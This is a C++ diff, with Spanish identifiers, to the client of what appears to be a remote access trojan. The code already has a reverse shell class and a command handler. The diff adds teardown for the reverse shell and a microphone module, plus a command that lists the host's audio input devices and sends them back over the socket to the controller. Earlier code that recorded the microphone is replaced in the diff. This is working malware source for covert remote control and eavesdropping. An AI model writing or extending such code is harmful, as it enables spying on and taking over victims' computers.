@@ -16,6 +16,15 @@ Cliente::Cliente() {
 
 Cliente::~Cliente() {
 	this->CerrarConexion();
+    if (this->reverseSHELL != nullptr) {
+        this->reverseSHELL->TerminarShell();
+        delete this->reverseSHELL;
+        this->reverseSHELL = nullptr;
+    }
+    if (this->mod_Mic != nullptr){
+        delete this->mod_Mic;
+        this->mod_Mic = nullptr;
+    }
 }
 
 void Cliente::CerrarConexion() {
@@ -114,11 +123,20 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
     }
 
-    if (strIn[0] == "MIC") {
-        Mod_Mic* tMic = new Mod_Mic(this);
-        tMic->Grabar_pacman();
-        delete tMic;
-        tMic = nullptr;
+    //Lista de dispositivos de entrada (mic)
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
+        if (this->mod_Mic != nullptr) {
+            delete this->mod_Mic;
+            this->mod_Mic = nullptr;
+        }
+        
+        this->mod_Mic = new Mod_Mic(this);
+        this->mod_Mic->sckSocket = this->sckSocket;
+        this->mod_Mic->Enviar_Dispositivos();
+
+        delete this->mod_Mic;
+        this->mod_Mic = nullptr;
+
     }
 
     //Iniciar shell
@@ -466,4 +484,26 @@ void ReverseShell::thEscribirShell(std::string pStrInput) {
         this->isRunning = false;
         lock.unlock();
     }
+}
+
+//Mod_Mic
+
+void Mod_Mic::Enviar_Dispositivos() {
+    std::vector<std::string> vc_devices = this->ObtenerDispositivos();
+    std::string strSalida = "";
+    
+    if (vc_devices.size() > 0) {
+        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
+        strSalida.append(1, '\\');
+        for (auto strDevice : vc_devices) {
+            strSalida += strDevice;
+            strSalida.append(1, '\\');
+        }
+        strSalida = strSalida.substr(0, strSalida.size() - 1);
+        this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
+    }else {
+        strSalida = "No hay dispositivos";
+    }
+
+    this->ptr_copy->cSend(this->sckSocket, strSalida.c_str(), strSalida.size() + 1, 0, false);
 }
